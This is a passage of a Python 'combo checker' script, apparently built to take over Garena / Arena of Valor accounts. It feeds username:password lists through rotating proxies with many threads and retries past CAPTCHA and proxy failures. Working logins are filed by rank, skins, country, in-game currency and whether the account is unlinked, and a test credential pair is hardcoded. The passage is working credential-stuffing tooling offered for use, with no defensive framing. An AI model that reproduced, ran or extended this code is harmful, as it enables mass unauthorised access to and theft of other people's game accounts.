                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_thach_dau"))
                return

            if is_master_at:
                _save("acc_trang_cao_thu.txt", hit_line)
                if ctry != "UNKNOWN": _save("acc_trang_cao_thu.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_cao_thu"))
                return

            if is_tinh_anh_at:
                _save("acc_trang_tinh_anh.txt", hit_line)
                if ctry != "UNKNOWN": _save("acc_trang_tinh_anh.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_tinh_anh"))
                return

            if is_kim_cuong_at:
                _save("acc_trang_kim_cuong.txt", hit_line)
                if ctry != "UNKNOWN": _save("acc_trang_kim_cuong.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_kim_cuong"))
                return

            if is_bach_kim_at:
                _save("acc_trang_bach_kim.txt", hit_line)
                if ctry != "UNKNOWN": _save("acc_trang_bach_kim.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_bach_kim"))
                return

            _save("acc_trang.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("acc_trang.txt", hit_line, subdir=subdir)
            _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang"))
            return

        try:
            qh = int(((r.get("aov_skins") or {}).get("cp", 0)) or 0)
        except Exception:
            qh = 0
        if qh >= 300:
            _save("qh_300_plus.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("qh_300_plus.txt", hit_line, subdir=subdir)
            return

        rank_raw = (r.get("aov_rank") or "").strip()
        rank_l = rank_raw.lower()
        rank_fold = unicodedata.normalize("NFKD", rank_l).encode("ascii", "ignore").decode("ascii")
        rank_norm = re.sub(r"[^a-z0-9\s]", " ", rank_fold)
        rank_norm = re.sub(r"\s+", " ", rank_norm).strip()
        
        is_kim_cuong = ("kim cương" in rank_l) or ("kim cuong" in rank_norm) or bool(re.search(r"\bk\s*cuong\b", rank_norm)) or bool(re.search(r"\bk\s*\.\s*cuong\b", rank_l)) or ("ไดมอนด์" in rank_l) or ("diamond" in rank_l) or ("鑽石" in rank_l)
        
        is_tinh_anh = ("tinh anh" in rank_norm) or bool(re.search(r"\bt\s*anh\b", rank_norm)) or bool(re.search(r"\bt\s*\.\s*anh\b", rank_l)) or ("คอมมานเดอร์" in rank_l) or ("commander" in rank_l) or ("星耀" in rank_l)
        
        is_chien_tuong = ("chiến tướng" in rank_l) or ("chien tuong" in rank_norm) or ("ซูพรีมคอนเควอร์เรอร์" in rank_l) or ("supreme conqueror" in rank_l) or ("璀璨傳說" in rank_l)
        
        is_chien_than = (
            ("chiến thần" in rank_l) or ("chien than" in rank_norm) or
            ("thách đấu" in rank_l) or ("thach dau" in rank_norm) or
            ("กลอเรียสรูเลอร์" in rank_l) or ("glorious ruler" in rank_l)
        )

        is_master = (
            ("cao thủ" in rank_l) or ("cao thu" in rank_l) or
            ("cao thu" in rank_norm) or
            bool(re.search(r"\bmaster\b", rank_norm)) or
            ("คอนเควอร์เรอร์" in rank_l and "ซูพรีม" not in rank_l) or
            ("conqueror" in rank_l and "supreme" not in rank_l) or
            ("戰場傳說" in rank_l)
        )

        if is_chien_tuong:
            _save("rank_chien_tuong.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_chien_tuong.txt", hit_line, subdir=subdir)
            return

        if is_chien_than:
            _save("rank_chien_than.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_chien_than.txt", hit_line, subdir=subdir)
            # Backward compatibility for old file naming.
            _save("rank_thach_dau.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_thach_dau.txt", hit_line, subdir=subdir)
            return

        if is_master:
            _save("rank_cao_thu.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_cao_thu.txt", hit_line, subdir=subdir)
            # Phân loại thêm theo số sao Cao Thủ (1-50)
            if r.get('aov_rank_stars'):
                stars = int(r.get('aov_rank_stars') or 0)
            else:
                stars = _extract_master_stars(rank_raw)
                
            if 1 <= stars <= 50:   # Cao Thủ có 1-50 sao
                star_file = f"rank_cao_thu_{stars}sao.txt"
                _save(star_file, hit_line)
                if ctry != "UNKNOWN":
                    _save(star_file, hit_line, subdir=subdir)
            else:
                # Không xác định được số sao → ghi vào file chung Cao Thủ
                _save("rank_cao_thu_unknown_sao.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("rank_cao_thu_unknown_sao.txt", hit_line, subdir=subdir)
            return

        if is_kim_cuong:
            _save("rank_kim_cuong.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_kim_cuong.txt", hit_line, subdir=subdir)
            return

        if is_tinh_anh:
            _save("rank_tinh_anh.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_tinh_anh.txt", hit_line, subdir=subdir)
            return

        _save("hit.txt", hit_line)
        _save("valid.txt", acc_pw)

        sk = r.get('aov_skins', {})
        has_aov = bool(r.get('aov_name') or sk)

        if has_aov:
            if r.get('is_th_rov'):
                _save("aov_thailand.txt", hit_line)
            elif r.get('is_tw_aov'):
                _save("aov_taiwan.txt", hit_line)
            else:
                _save("aov.txt", hit_line)
                
            total_skins = sk.get('total_skins', 0) if sk else 0
            if total_skins == 0:
                _save("no skin.txt", hit_line)
            if sk.get('ss'):
                _save("ssSkin.txt", hit_line)
            if sk.get('sss'):
                _save("sssSkin.txt", hit_line)
            if sk.get('anime'):
                _save("anime.txt", hit_line)
            if sk.get('other'):
                _save("otherSkin.txt", hit_line)

        _save("hit.txt", hit_line, subdir=subdir)
        _save("valid.txt", acc_pw, subdir=subdir)

    elif status == "INVALID":
        _save("die.txt", acc_pw)
        # ── Tạch acc: phân loại theo sò + nước ──
        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        try:
            so = int(r.get("shells", 0) or 0)
        except Exception:
            so = 0
        tach_line = f"{acc_pw} | status={status} | so={so} | country={ctry}"
        _save("tach_acc.txt", tach_line)
        if so > 0:
            _save("tach_acc_so.txt", tach_line)
        if ctry != "UNKNOWN":
            _save(f"{ctry}.txt", tach_line, subdir=os.path.join("tach_acc_country"))
            if so > 0:
                _save(f"{ctry}.txt", tach_line, subdir=os.path.join("tach_acc_so_country"))
    elif status in ("ERROR", "TIMEOUT", "MISS"):
        detail = r.get("detail", "")
        if status == "MISS" and (
            "PREPARE_FAIL result=101" in detail or
            "PREPARE_FAIL result=105" in detail or
            "PREPARE_FAIL result=174" in detail
        ):
            return
        _save("error.txt", acc_pw)
        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        try:
            so = int(r.get("shells", 0) or 0)
        except Exception:
            so = 0
        tach_line = f"{acc_pw} | status={status} | so={so} | country={ctry} | detail={detail}"
        _save("tach_acc.txt", tach_line)
        if so > 0:
            _save("tach_acc_so.txt", tach_line)
        if ctry != "UNKNOWN":
            subdir = os.path.join("country", ctry)
            _save("error.txt", acc_pw, subdir=subdir)
            _save(f"{ctry}.txt", tach_line, subdir=os.path.join("tach_acc_country"))
            if so > 0:
                _save(f"{ctry}.txt", tach_line, subdir=os.path.join("tach_acc_so_country"))

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global _QUIET_BULK
    _print_banner()
    import threading
    args = sys.argv[1:]

    # Strip info flags
    test_login = any(a in ("--test-login", "-t") for a in args)
    args = [a for a in args if a not in ('--info', '-i', '--test-login', '-t')]

    if test_login:
        account = input("Account: ").strip()
        password = input("Password: ").strip()
        use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
        proxy = None
        if use_proxy:
            proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
            if os.path.isfile(proxy_path):
                load_proxies(proxy_path)
                proxy = _next_proxy()
        r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
        print(r)
        if r.get("status") == "HIT":
            _save_result(r)
        return

    if not args:
        print("Chọn chức năng:")
        print("1. Test login bug (tommy199999999:quang098)")
        print("2. Check combo file")
        mode = input("Nhập số (mặc định 2): ").strip() or "2"

        if mode == "1":
            account = "tommy199999999"
            password = "quang098"
            print(f"Đang test login bug với {account}:{password}")
            use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
            proxy = None
            if use_proxy:
                proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
                if os.path.isfile(proxy_path):
                    load_proxies(proxy_path)
                    proxy = _next_proxy()

            r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
            _print_result(r, verbose=True)
            print(r)
            if r.get("status") == "HIT":
                _save_result(r)
            return

        os.makedirs("combo", exist_ok=True)
        files = [f for f in os.listdir("combo") if f.lower().endswith(".txt")]
        files.sort()
        if not files:
            print("Không có file .txt trong thư mục combo/")
            return
        print("Chọn file combo:")
        for i, f in enumerate(files, 1):
            print(f"{i}. {f}")
        while True:
            c = input("Nhập số: ").strip()
            if c.isdigit() and 1 <= int(c) <= len(files):
                break
        combo_arg = os.path.join("combo", files[int(c) - 1])
        t = input("Threads (mặc định 5): ").strip()
        threads = int(t) if t.isdigit() and int(t) > 0 else 5
        proxy_in = input("Proxy file (Enter để bỏ qua): ").strip()
        if proxy_in:
            proxy_file = proxy_in if os.path.isfile(proxy_in) else os.path.join("combo", proxy_in)
            args = [combo_arg, str(threads), proxy_file] if os.path.isfile(proxy_file) else [combo_arg, str(threads)]
        else:
            args = [combo_arg, str(threads)]

    combo_arg = args[0] if args else ""
    combo_file = combo_arg if combo_arg and os.path.isfile(combo_arg) else ""
    if not combo_file and combo_arg:
        combo_in_folder = os.path.join("combo", combo_arg)
        if os.path.isfile(combo_in_folder):
            combo_file = combo_in_folder

    if combo_file:
        # Bulk mode: python check.py acc.txt [threads] [proxy.txt]
        # Any integer arg = threads, any extra file arg = proxy
        threads    = 5
        proxy_file = None
        for a in args[1:]:
            if a.isdigit():
                threads = max(1, int(a))
            elif os.path.isfile(a):
                proxy_file = a

        if proxy_file:
            load_proxies(proxy_file)
            print(f"Loaded {len(_proxy_list)} proxies from {proxy_file}")
            print(_c(C.YELLOW, "Đang kiểm tra proxy..."))
            validate_proxies(print_fn=print)

        combos = load_combos(combo_file)
        
        # ── Lọc bỏ acc đã có trong thư mục res/ ─────────────────────────────
        _existing_combos = set()
        if os.path.isdir("res"):
            print(_c(C.YELLOW, "Đang quét các file trong res/ để lọc trùng lặp..."))
            for root, dirs, files in os.walk("res"):
                for f in files:
                    if f.lower().endswith(".txt"):
                        try:
                            with open(os.path.join(root, f), 'r', encoding='utf-8', errors='ignore') as fp:
                                for line in fp:
                                    if '|' in line:
                                        p = line.split('|')
                                        _existing_combos.add(f"{p[0].strip()}:{p[1].strip()}")
                                    elif ':' in line:
                                        p = line.split(':')
                                        _existing_combos.add(f"{p[0].strip()}:{p[1].strip()}")
                        except Exception:
                            pass
        original_size = len(combos)
        combos = [(u, p) for (u, p) in combos if f"{u}:{p}" not in _existing_combos]
        filtered = original_size - len(combos)
        if filtered > 0:
            print(_c(C.GREEN, f"Đã lọc bỏ {filtered} acc đã tồn tại trong res/"))
        
        total = len(combos)
        if total == 0:
            print(_c(C.RED, "Không còn acc nào mới để check."))
            return
        # ───────────────────────────────────────────────────────────────────────

        print(f"Loaded {total} combos | threads={threads}")
        if threads > 500:
            print(_c(C.YELLOW, f"  [!] threads={threads} qua cao co the gay 'WinError 10048' (Windows het port). Khuyen dung <= 500."))

        hits_lock = threading.Lock()
        _stats = {
            'done': 0, 'total': total, 'hits': 0, 'invalid': 0, 'error': 0,
            'white_hits': 0, 'white_shells': 0,
        }
        _started_at = time.time()
        _QUIET_BULK = True

        # MISS result=101/105/174 = tai khoan khong phai Garena -> bo qua ERR
        _SKIP_MISS = ('result=101', 'result=105', 'result=174')

        def _worker(entry):
            idx, acc, pw = entry
            
            for attempt in range(6):
                proxy = _next_proxy()
                        
                r = check_login(acc, pw, fetch_info=True, proxy=proxy)
                is_skip_miss = (
                    r['status'] == 'MISS' and
                    any(code in r.get('detail', '') for code in _SKIP_MISS)
                )
                
                # Retry on transient errors: ERROR, TIMEOUT, MISS, CAPTCHA, PROXY_FAIL
                if (r['status'] in ('ERROR', 'TIMEOUT', 'MISS', 'CAPTCHA', 'PROXY_FAIL')) and not is_skip_miss:
                    if attempt < 5:
                        time.sleep(0.5)  # Nghỉ 0.5s trước khi retry
                        continue
                break  # Thành công, Sai pass, hoặc hết 6 lần -> thoát vòng lặp
                
            with hits_lock:
                _stats['done'] += 1
                if r['status'] == 'HIT':
                    _stats['hits'] += 1
                    if _derive_tinh_trang(r) == 'Acc Trắng':
                        _stats['white_hits'] += 1
                        try:
                            _stats['white_shells'] += int(r.get('shells', 0) or 0)
                        except Exception:
                            pass
                elif r['status'] == 'INVALID':
                    _stats['invalid'] += 1
                elif not is_skip_miss and r['status'] in ('ERROR', 'TIMEOUT', 'MISS', 'PROXY_FAIL', 'CAPTCHA'):
                    _stats['error'] += 1
                snap = dict(_stats)
            with _print_lock:
                _print_bulk_status(snap, _started_at)
            _save_result(r)

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                ex.map(_worker, ((i + 1, a, p) for i, (a, p) in enumerate(combos)))
        finally:
            _QUIET_BULK = False

        hits_total = _stats['hits']
        white_hits_total = _stats.get('white_hits', 0)
        white_shells_total = _stats.get('white_shells', 0)
        print()
        print(_c(C.CYAN + C.BOLD, f"\n{'═'*50}"))
        print(_c(C.GREEN + C.BOLD, f"  ✔  DONE: {hits_total} HIT / {total} accounts  →  res/"))
        print(_c(C.YELLOW + C.BOLD, f"  ✔  ACC TRẮNG: {white_hits_total} | TỔNG SÒ ACC TRẮNG: {white_shells_total}"))
        print(_c(C.CYAN + C.BOLD, f"{'═'*50}"))
        return

    # Single check mode
    if len(args) < 2:
        print("Usage: python check.py <account> <password>")
        print("       python check.py <combo_file.txt> [threads] [proxy.txt]")
        print("       python check.py --test-login")
        print("  threads default = 5")
        return
    account  = args[0]
    password = args[1]
    print(f"Checking {account}")
    r = check_login(account, password, fetch_info=True)
    _print_result(r, verbose=True)
    _save_result(r)
    if r["status"] == "HIT":
        print(f"  -> saved to result/")

if __name__ == "__main__":
    main()

